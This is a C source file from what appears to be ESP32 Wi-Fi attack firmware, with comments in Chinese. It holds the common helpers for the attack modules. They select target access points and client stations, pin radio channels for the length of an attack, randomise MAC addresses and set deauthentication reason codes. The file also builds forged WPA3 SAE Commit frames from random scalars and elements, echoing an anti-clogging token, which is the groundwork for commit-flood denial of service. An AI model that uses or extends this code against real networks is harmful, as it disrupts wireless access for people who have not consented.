// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 XDUPWW

#include "attacks/attack_common.h"

#include <stdarg.h>
#include <stdio.h>
#include <string.h>

#include "attacks/attack.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "hal_wifi/hal_wifi.h"
#include "wbus/wbus.h"
#include "wifi_frame/frame_build.h"
#include "wifi_frame/frames.h"
#include "wifi_frame/mac.h"

static uint32_t s_started_ms;

uint32_t attack_now_ms(void) {
    return (uint32_t)(esp_timer_get_time() / 1000);
}

bool attack_target_ap(uint32_t idx, wt_entry_t *out) {
    // idx 就是 scan.list 里显示的那个序号，从 1 开始：用户照着列表填数字，
    // 不用在脑子里减一。
    if (idx == 0) {
        return false;
    }
    const wt_entry_t *entry = wt_at(idx - 1);
    if (entry == NULL || entry->kind != WT_KIND_AP) {
        return false;
    }
    if (out != NULL) {
        *out = *entry;
    }
    return true;
}

void attack_exclusive(void) {
    attacks_stop_all();
    // 所有攻击的 start 第一句都是它，计时打点放这儿就不用每个模块写一遍
    s_started_ms = attack_now_ms();
}

esp_err_t attack_pin(const char *owner, uint8_t channel) {
    // 不设过期时间：攻击跑多久信道就占多久，停了才还
    return hal_wifi_channel_acquire(owner, HAL_CH_PINNED, channel, 0);
}

void attack_unpin(const char *owner) {
    hal_wifi_channel_release(owner);
}

void attack_emit(const char *object, bool active, const char *fmt, ...) {
    char detail[WB_VAL_MAX];
    detail[0] = '\0';
    if (fmt != NULL) {
        va_list ap;
        va_start(ap, fmt);
        vsnprintf(detail, sizeof(detail), fmt, ap);
        va_end(ap);
    }
    if (detail[0] != '\0') {
        wb_emit(object, "state", "active=%d %s", active ? 1 : 0, detail);
    } else {
        wb_emit(object, "state", "active=%d", active ? 1 : 0);
    }
}

size_t attack_sta_on_channel(uint8_t channel, uint8_t out[][6], size_t cap) {
    hal_wifi_sta_t list[HAL_WIFI_STA_MAX];
    size_t n = hal_wifi_sta_list_passive(list, HAL_WIFI_STA_MAX);
    if (n > HAL_WIFI_STA_MAX) {
        n = HAL_WIFI_STA_MAX;
    }
    size_t count = 0;
    for (size_t i = 0; i < n && count < cap; i++) {
        // 没学到信道的一律当成本信道，否则刚开混杂时会一个目标都发不出去
        if (list[i].channel != 0 && channel != 0 && list[i].channel != channel) {
            continue;
        }
        memcpy(out[count++], list[i].mac, 6);
    }
    return count;
}

void attack_random_mac(uint8_t out[6]) {
    wf_mac_randomize(out, ((uint64_t)esp_random() << 32) | esp_random());
}

uint16_t attack_reason(uint32_t value) {
    if (value == 0 || value > 0xFFFF) {
        return 1;
    }
    return (uint16_t)value;
}

void attack_mark_start(void) {
    s_started_ms = attack_now_ms();
}

uint32_t attack_elapsed_ms(void) {
    if (s_started_ms == 0) {
        return 0;
    }
    const uint32_t now = attack_now_ms();
    return (now > s_started_ms) ? (now - s_started_ms) : 0;
}

// 每个模块 stop 时都报一句：帧数除以真实墙钟时间才是有意义的速率，
// 不然 bench 里看到的 fps 全是自己估的。
void attack_report_rate(wb_reply_t *reply, const char *name, uint32_t frames) {
    const uint32_t ms = attack_elapsed_ms();
    if (ms == 0) {
        wb_reply_line(reply, "%s 停 frames=%u ms=0", name, (unsigned)frames);
        return;
    }
    const uint32_t fps10 = (uint32_t)((uint64_t)frames * 10000u / ms);
    wb_reply_line(reply, "%s 停 frames=%u ms=%u fps=%u.%u", name, (unsigned)frames,
                  (unsigned)ms, (unsigned)(fps10 / 10u), (unsigned)(fps10 % 10u));
}

// P-256（secp256r1）的生成元，公开常量，也是一个合法曲线点
static const uint8_t kP256Generator[ATTACK_SAE_ELEMENT_LEN] = {
    0x6B, 0x17, 0xD1, 0xF2, 0xE1, 0x2C, 0x42, 0x47, 0xF8, 0xBC, 0xE6, 0xE5, 0x63, 0xA4, 0x40, 0xF2,
    0x77, 0x03, 0x7D, 0x81, 0x2D, 0xEB, 0x33, 0xA0, 0xF4, 0xA1, 0x39, 0x45, 0xD8, 0x98, 0xC2, 0x96,
    0x4F, 0xE3, 0x42, 0xE2, 0xFE, 0x1A, 0x7F, 0x9B, 0x8E, 0xE7, 0xEB, 0x4A, 0x7C, 0x0F, 0x9E, 0x16,
    0x2B, 0xCE, 0x33, 0x57, 0x6B, 0x31, 0x5E, 0xCE, 0xCB, 0xB6, 0x40, 0x68, 0x37, 0xBF, 0x51, 0xF5,
};

void attack_sae_fill(uint8_t scalar[ATTACK_SAE_SCALAR_LEN],
                     uint8_t element[ATTACK_SAE_ELEMENT_LEN], bool real_point) {
    for (int i = 0; i < ATTACK_SAE_SCALAR_LEN; i += 4) {
        const uint32_t word = esp_random();
        memcpy(scalar + i, &word, 4);
    }
    // 最高字节别留成 0，一个明显短于阶的标量更容易被当成有效性判据
    scalar[0] |= 0x01;
    if (real_point) {
        memcpy(element, kP256Generator, ATTACK_SAE_ELEMENT_LEN);
        return;
    }
    for (int i = 0; i < ATTACK_SAE_ELEMENT_LEN; i += 4) {
        const uint32_t word = esp_random();
        memcpy(element + i, &word, 4);
    }
}

int attack_build_sae_commit(uint8_t *buf, size_t cap, const uint8_t da[6], const uint8_t sa[6],
                            const uint8_t bssid[6], const uint8_t scalar[ATTACK_SAE_SCALAR_LEN],
                            const uint8_t element[ATTACK_SAE_ELEMENT_LEN]) {
    return attack_build_sae_commit_tok(buf, cap, da, sa, bssid, NULL, 0, scalar, element);
}

int attack_build_sae_commit_tok(uint8_t *buf, size_t cap, const uint8_t da[6], const uint8_t sa[6],
                                const uint8_t bssid[6], const uint8_t *token, size_t token_len,
                                const uint8_t scalar[ATTACK_SAE_SCALAR_LEN],
                                const uint8_t element[ATTACK_SAE_ELEMENT_LEN]) {
    if (token_len > 64) {
        token_len = 64;
    }
    uint8_t extra[2 + 64 + ATTACK_SAE_SCALAR_LEN + ATTACK_SAE_ELEMENT_LEN];
    size_t n = 0;
    wf_put_le16(extra + n, ATTACK_SAE_GROUP_P256);
    n += 2;
    if (token_len > 0 && token != NULL) {
        // 回显的位置和长度都照 AP 给的抄，非 H2E 的 Commit 就是这个形状
        memcpy(extra + n, token, token_len);
        n += token_len;
    }
    memcpy(extra + n, scalar, ATTACK_SAE_SCALAR_LEN);
    n += ATTACK_SAE_SCALAR_LEN;
    memcpy(extra + n, element, ATTACK_SAE_ELEMENT_LEN);
    n += ATTACK_SAE_ELEMENT_LEN;
    return wf_build_auth_ext(buf, cap, da, sa, bssid, 3, 1, 0, extra, n);
}
